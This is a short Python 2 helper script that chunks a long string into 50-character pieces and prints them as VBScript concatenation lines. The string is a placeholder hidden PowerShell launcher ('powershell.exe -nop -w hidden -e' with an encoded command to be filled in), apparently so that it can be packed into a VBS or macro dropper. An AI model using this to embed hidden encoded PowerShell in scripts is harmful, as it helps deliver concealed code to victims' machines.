# a script to condense long lines for packing in vbs scripts
# I think the idea here is that it should be some shorter number of 
# characters wide ... so I chose 50, that's pretty small


str = "powershell.exe -nop -w hidden -e your B64 Encoded String here..."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'

